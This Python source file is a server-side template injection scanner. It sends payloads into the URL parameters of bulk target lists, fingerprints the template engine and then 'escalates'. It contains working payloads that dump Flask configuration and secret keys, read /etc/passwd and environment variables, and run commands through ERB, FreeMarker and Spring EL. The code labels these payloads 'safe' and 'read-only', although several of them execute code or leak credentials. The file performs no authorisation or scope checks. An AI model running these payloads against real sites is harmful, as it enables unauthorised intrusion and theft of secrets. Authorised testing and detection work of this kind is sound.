#!/usr/bin/env python3
"""
ssti_scan.py — Server-Side Template Injection Scanner

Detects SSTI via reflection checks, polyglot detection, math-based
confirmation, engine fingerprinting, and safe escalation probes.

Engines detected: Jinja2, Twig, Freemarker, Velocity, Thymeleaf,
                  ERB, EJS, Pebble, Spring EL, Smarty, Mako

Severity classification:
  P1:SSTI:CRIT   — escalation probe returns system data (config, env, command output)
  P1:SSTI:HIGH   — math expression confirms template execution
  P3:SSTI:MEDIUM — polyglot triggers template error suggesting processing

Output format: [Px:TYPE:CONFIDENCE] TEST_NAME | url | detail

Usage:
  python3 ssti_scan.py -i urls.txt -o findings.txt -t 10
  python3 ssti_scan.py -i urls.txt -o /dev/stdout --dry-run
"""

import argparse
import random
import re
import string
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Globals set from args ──
SESSION = None
TIMEOUT = 10
USER_AGENT = "noleak"

# ── Random math operands (unique per run to avoid false positives) ──
MATH_A = random.randint(41, 97)
MATH_B = random.randint(13, 59)
MATH_RESULT = str(MATH_A * MATH_B)

# Jinja2 string multiplication: {{7*'7'}} → '7777777'
STR_MUL_A = random.randint(3, 9)
STR_MUL_RESULT = str(STR_MUL_A) * STR_MUL_A

# Polyglot that triggers errors or partial rendering across engines
POLYGLOT = "${{<%[%'\"}}%\\"

# ── Math-based detection probes: (payload, expected, engine_label) ──
MATH_PROBES = [
    (f"{{{{{MATH_A}*{MATH_B}}}}}", MATH_RESULT, "JINJA2_OR_TWIG"),
    (f"${{{MATH_A}*{MATH_B}}}", MATH_RESULT, "FREEMARKER_OR_VELOCITY"),
    (f"#{{{MATH_A}*{MATH_B}}}", MATH_RESULT, "RUBY_ERB_OR_PEBBLE"),
    (f"<%= {MATH_A}*{MATH_B} %>", MATH_RESULT, "EJS_OR_ERB"),
    (f"{{{{{STR_MUL_A}*'{STR_MUL_A}'}}}}", STR_MUL_RESULT, "JINJA2_STRMUL"),
    (f"${{T(java.lang.Math).random()}}", r"0\.\d+", "SPRING_EL"),
]

# ── Error-based fingerprinting probes ──
ERROR_PROBES = [
    ("{{(1/0).zxy.zxy}}", r"ZeroDivisionError", "JINJA2"),
    ("${(1/0)}", r"(ArithmeticException|Division)", "FREEMARKER"),
    ("{{1/0}}", r"(DivisionByZero|divide)", "TWIG"),
    ("${\"\".getClass()}", r"(freemarker|class java\.lang\.String)", "FREEMARKER"),
    ("{{self.__class__}}", r"(TemplateReference|Undefined|class)", "JINJA2"),
]

# ── Engine-specific fingerprint probes (refine generic detection) ──
FINGERPRINT_PROBES = {
    "JINJA2_OR_TWIG": [
        ("{{config}}", r"(SECRET_KEY|DEBUG|ENV|SQLALCHEMY)", "JINJA2"),
        ("{{request.environ}}", r"(SERVER_NAME|REQUEST_METHOD|wsgi)", "JINJA2"),
        ("{{_self.env.display('X')}}", r"X", "TWIG_OLD"),
        ("{{'/etc/passwd'|file_excerpt(1,5)}}", r"root:", "TWIG"),
    ],
    "FREEMARKER_OR_VELOCITY": [
        ("${.version}", r"\d+\.\d+\.\d+", "FREEMARKER"),
        ("<#assign x='test'>${x}", r"test", "FREEMARKER"),
        ("#set($x='velocity_test')$x", r"velocity_test", "VELOCITY"),
    ],
    "RUBY_ERB_OR_PEBBLE": [
        ("<%= `id` %>", r"uid=", "ERB_RCE"),
        ("<%= ENV %>", r"(HOME|PATH|USER)", "ERB"),
    ],
    "EJS_OR_ERB": [
        ("<%= process.env %>", r"(HOME|PATH|NODE)", "EJS"),
        ("<%= 7*7 %>", r"49", "EJS_OR_ERB"),
    ],
    "JINJA2_STRMUL": [
        ("{{config}}", r"(SECRET_KEY|DEBUG|ENV|SQLALCHEMY)", "JINJA2"),
        ("{{request.environ}}", r"(SERVER_NAME|REQUEST_METHOD|wsgi)", "JINJA2"),
    ],
    "SPRING_EL": [
        ("${T(java.lang.Runtime).getRuntime().exec('id')}", r"(Process|java\.lang)", "SPRING_EL"),
    ],
}

# ── Safe escalation probes (read-only, non-destructive) ──
ESCALATION_PROBES = {
    "JINJA2": [
        ("{{config}}", r"(SECRET_KEY|DATABASE|SQLALCHEMY)", "CONFIG_DUMP"),
        ("{{config.items()}}", r"(SECRET_KEY|DATABASE)", "CONFIG_ITEMS"),
        ("{{request.environ}}", r"(SERVER_NAME|REQUEST_METHOD|wsgi)", "ENVIRON_DUMP"),
    ],
    "FREEMARKER": [
        ("${.data_model}", r".", "DATA_MODEL"),
        ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", r"uid=", "RCE_EXEC"),
    ],
    "VELOCITY": [
        ("$class.inspect(\"java.lang.Runtime\")", r"(Runtime|Method|invoke)", "RUNTIME_INSPECT"),
    ],
    "TWIG": [
        ("{{app.request.server.all}}", r"(SERVER_NAME|DOCUMENT_ROOT)", "SERVER_VARS"),
        ("{{_self.env.display('id')}}", r"(uid=|twig)", "ENV_DISPLAY"),
    ],
    "ERB": [
        ("<%= Dir.entries('/') %>", r"(etc|usr|bin|tmp)", "DIR_LIST"),
    ],
    "EJS": [
        ("<%= process.version %>", r"v\d+\.\d+", "NODE_VERSION"),
    ],
    "SPRING_EL": [
        ("${T(java.lang.Runtime).getRuntime().exec('id')}", r"(Process|java\.lang)", "RUNTIME_EXEC"),
    ],
}

# Static assets to skip
SKIP_EXT = re.compile(
    r"\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|"
    r"pdf|zip|tar|gz|mp4|mp3|webp|avif)(\?|$)", re.I
)


def random_marker():
    """Generate a unique random string for reflection checks."""
    return "ssti_rnd_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def safe_get(url):
    """Make a GET request, returning (status_code, body) or (None, '')."""
    try:
        resp = SESSION.get(url, allow_redirects=True, timeout=TIMEOUT, verify=False)
        return resp.status_code, resp.text
    except requests.RequestException:
        return None, ""


def inject_param(url, param, payload):
    """Replace a single query parameter's value with payload."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if param not in params:
        return None
    params[param] = [payload]
    flat = {k: v[0] for k, v in params.items()}
    new_query = urlencode(flat)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                       parsed.params, new_query, parsed.fragment))


def get_params(url):
    """Extract query parameter names from URL."""
    parsed = urlparse(url)
    return list(parse_qs(parsed.query, keep_blank_values=True).keys())


def check_reflection(url, param):
    """Inject a unique marker and check if it appears in the response."""
    marker = random_marker()
    test_url = inject_param(url, param, marker)
    if not test_url:
        return False
    status, body = safe_get(test_url)
    return bool(status and marker in body)


def check_polyglot(url, param):
    """Send polyglot and check for template engine error strings."""
    findings = []
    poly_url = inject_param(url, param, POLYGLOT)
    if not poly_url:
        return findings

    status, body = safe_get(poly_url)
    if not status:
        return findings

    lower_body = body.lower()
    engine_errors = [
        "templateerror", "templatesyntaxerror", "twig", "freemarker",
        "velocity", "jinja", "mako", "smarty", "pebble", "thymeleaf",
        "expressionparser", "evaluationexception", "spring",
        "el exception", "spel", "ognl",
    ]

    for err_str in engine_errors:
        if err_str in lower_body:
            findings.append(
                f"[P3:SSTI:MEDIUM] POLYGLOT_ERROR | {url} param={param} | "
                f"Template error '{err_str}' triggered by polyglot probe (status={status})"
            )
            break

    return findings


def check_math_probes(url, param):
    """Run math-based expression probes to confirm template execution."""
    for payload, expected, engine in MATH_PROBES:
        test_url = inject_param(url, param, payload)
        if not test_url:
            continue

        status, body = safe_get(test_url)
        if status is None:
            continue

        # Spring EL returns a random decimal — match with regex
        if engine == "SPRING_EL":
            if re.search(expected, body):
                # Verify not a static match
                verify_url = inject_param(url, param, "LITERAL_SPRINGEL_CHECK")
                if verify_url:
                    _, verify_body = safe_get(verify_url)
                    if re.search(expected, verify_body):
                        continue
                return engine, (
                    f"[P1:SSTI:HIGH] {engine}_MATH | {url} param={param} | "
                    f"payload={payload} matched decimal pattern (status={status})"
                )
        else:
            if expected in body:
                # Verify the result isn't statically present regardless of input
                verify_url = inject_param(url, param, f"LITERAL_{expected}_CHECK")
                if verify_url:
                    _, verify_body = safe_get(verify_url)
                    if expected in verify_body:
                        continue  # Static value — not SSTI

                return engine, (
                    f"[P1:SSTI:HIGH] {engine}_MATH | {url} param={param} | "
                    f"payload={payload} rendered {expected} (status={status})"
                )

    return None, None


def check_error_fingerprint(url, param):
    """Use error-triggering payloads to fingerprint the engine."""
    # Get baseline response to compare against
    baseline_url = inject_param(url, param, "ssti_baseline_safe_value")
    _, baseline_body = safe_get(baseline_url) if baseline_url else (None, "")

    for payload, pattern, engine in ERROR_PROBES:
        test_url = inject_param(url, param, payload)
        if not test_url:
            continue
        status, body = safe_get(test_url)
        if not status:
            continue
        match = re.search(pattern, body, re.I)
        if match:
            # FP guard: check if the pattern also matches baseline (static content)
            if baseline_body and re.search(pattern, baseline_body, re.I):
                continue  # Pattern exists without payload — false positive
            return engine, (
                f"[P3:SSTI:MEDIUM] {engine}_ERROR | {url} param={param} | "
                f"Error fingerprint matched '{pattern}' (status={status})"
            )
    return None, None


def _is_url_reflected(body, payload):
    """Check if matches only appear inside URL-reflected content (href, action, og:url, etc.)."""
    if not body or not payload:
        return False
    # Strip the payload from body to see if matches still exist
    # Look for pattern matches that are NOT inside URL attributes
    # URL attributes: href="...", action="...", og:url content="...", src="..."
    url_attr_pattern = re.compile(
        r'(?:href|action|src|content|value|data-url|data-href)=["\'][^"\']*',
        re.I
    )
    # Remove all URL attribute values from body
    cleaned = url_attr_pattern.sub('', body)
    return cleaned


def refine_engine(url, param, generic_engine):
    """Run engine-specific fingerprint probes to narrow down the engine."""
    if generic_engine not in FINGERPRINT_PROBES:
        return generic_engine, None

    # Get baseline for comparison
    baseline_url = inject_param(url, param, "ssti_refine_baseline")
    _, baseline_body = safe_get(baseline_url) if baseline_url else (None, "")

    for payload, pattern, refined in FINGERPRINT_PROBES[generic_engine]:
        test_url = inject_param(url, param, payload)
        if not test_url:
            continue
        status, body = safe_get(test_url)
        if not status:
            continue
        if re.search(pattern, body, re.I):
            # FP guard 1: check if pattern exists in baseline
            if baseline_body and re.search(pattern, baseline_body, re.I):
                continue

            # FP guard 2: check if matches only appear inside URL-reflected content
            cleaned_body = _is_url_reflected(body, payload)
            if not re.search(pattern, cleaned_body, re.I):
                continue  # Pattern only in URL attributes — false positive

            finding = (
                f"[P1:SSTI:HIGH] {refined}_CONFIRMED | {url} param={param} | "
                f"Engine fingerprinted via {payload} (status={status})"
            )
            return refined, finding

    return generic_engine, None


def check_escalation(url, param, engine):
    """Run safe read-only escalation probes for the detected engine."""
    findings = []
    # Get baseline for comparison
    baseline_url = inject_param(url, param, "ssti_escalation_baseline")
    _, baseline_body = safe_get(baseline_url) if baseline_url else (None, "")

    # Normalize engine name to base (e.g. JINJA2_STRMUL → JINJA2)
    base = engine.split("_")[0] if "_" in engine else engine
    # Handle composite names
    for key in ESCALATION_PROBES:
        if base.startswith(key) or key == base:
            for payload, pattern, esc_type in ESCALATION_PROBES[key]:
                test_url = inject_param(url, param, payload)
                if not test_url:
                    continue
                status, body = safe_get(test_url)
                if not status:
                    continue
                if re.search(pattern, body, re.I):
                    # FP guard 1: check if pattern exists in baseline
                    if baseline_body and re.search(pattern, baseline_body, re.I):
                        continue  # Static content — false positive

                    # FP guard 2: check if matches only in URL-reflected content
                    cleaned_body = _is_url_reflected(body, payload)
                    if not re.search(pattern, cleaned_body, re.I):
                        continue  # Only in URL attributes — false positive

                    findings.append(
                        f"[P1:SSTI:CRIT] {engine}_{esc_type} | {url} param={param} | "
                        f"Escalation payload '{payload}' leaked sensitive data (status={status})"
                    )
            break

    return findings


def test_param(url, param):
    """Full SSTI test pipeline for a single URL+param pair."""
    findings = []

    # Step 1: Reflection check — only test params that reflect
    if not check_reflection(url, param):
        return findings

    # Step 2: Polyglot detection
    poly_findings = check_polyglot(url, param)
    findings.extend(poly_findings)

    # Step 3: Math-based confirmation
    engine, math_finding = check_math_probes(url, param)
    if math_finding:
        findings.append(math_finding)

    # Step 3b: Error-based fingerprinting if math didn't match
    if not engine:
        engine, err_finding = check_error_fingerprint(url, param)
        if err_finding:
            findings.append(err_finding)

    # No engine detected — return whatever we have (polyglot errors)
    if not engine:
        return findings

    # Step 4: Refine engine identification
    refined_engine, fp_finding = refine_engine(url, param, engine)
    if fp_finding:
        findings.append(fp_finding)

    # Step 5: Safe escalation probes
    esc_findings = check_escalation(url, param, refined_engine)
    findings.extend(esc_findings)

    return findings


def test_url(url):
    """Test all query parameters in a URL for SSTI."""
    all_findings = []
    params = get_params(url)
    if not params:
        return all_findings

    for param in params:
        all_findings.extend(test_param(url, param))

    return all_findings


def main():
    parser = argparse.ArgumentParser(
        description="Server-Side Template Injection Scanner"
    )
    parser.add_argument("-i", "--input", required=True,
                        help="Input file with parameterized URLs")
    parser.add_argument("-o", "--output", default="ssti_findings.txt",
                        help="Output file for findings (default: ssti_findings.txt)")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Thread count (default: 10)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="HTTP request timeout in seconds (default: 10)")
    parser.add_argument("--user-agent", default="noleak",
                        help="User-Agent string for requests")
    parser.add_argument("--dry-run", action="store_true",
                        help="Print targets without making requests")
    parser.add_argument("--max-urls", type=int, default=3000,
                        help="Max URLs to test (default: 3000)")
    args = parser.parse_args()

    # Configure globals
    global SESSION, TIMEOUT, USER_AGENT
    TIMEOUT = args.timeout
    USER_AGENT = args.user_agent
    SESSION = requests.Session()
    SESSION.headers.update({"User-Agent": USER_AGENT})

    # Load URLs
    try:
        with open(args.input, "r") as f:
            raw_urls = [line.strip() for line in f
                        if line.strip() and line.strip().startswith("http")]
    except (IOError, PermissionError) as e:
        print(f"[ERROR] Cannot read input: {e}", file=sys.stderr)
        sys.exit(1)

    if not raw_urls:
        print("[*] No URLs to test")
        return

    # Filter: must have query params, skip static assets
    urls = [u for u in raw_urls if "?" in u and not SKIP_EXT.search(u)]

    # Deduplicate by host+path (keep first seen param combo per path)
    seen = set()
    deduped = []
    for url in urls:
        p = urlparse(url)
        key = f"{p.netloc}{p.path}"
        if key not in seen:
            seen.add(key)
            deduped.append(url)
    urls = deduped[:args.max_urls]

    print(f"[*] Loaded {len(raw_urls)} raw, filtered to {len(urls)} testable URLs")

    if args.dry_run:
        for url in urls:
            params = get_params(url)
            print(f"[DRY-RUN] {url} | params: {', '.join(params)}")
        return

    # Thread-safe collection
    lock = threading.Lock()
    progress = [0]
    all_findings = []

    def worker(url):
        findings = test_url(url)
        with lock:
            progress[0] += 1
            if progress[0] % 50 == 0 or findings:
                print(f"[*] Progress: {progress[0]}/{len(urls)} URLs tested")
            for f in findings:
                print(f"  {f}")
                all_findings.append(f)

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {pool.submit(worker, url): url for url in urls}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"  [ERROR] {futures[future]}: {e}", file=sys.stderr)

    # Write output
    try:
        with open(args.output, "w") as f:
            for line in all_findings:
                f.write(line + "\n")
    except (IOError, PermissionError) as e:
        print(f"[ERROR] Cannot write output: {e}", file=sys.stderr)

    print(f"\n[*] Scan complete: {len(urls)} URLs tested, {len(all_findings)} finding(s)")
    if all_findings:
        print(f"[*] Results written to {args.output}")


if __name__ == "__main__":
    main()
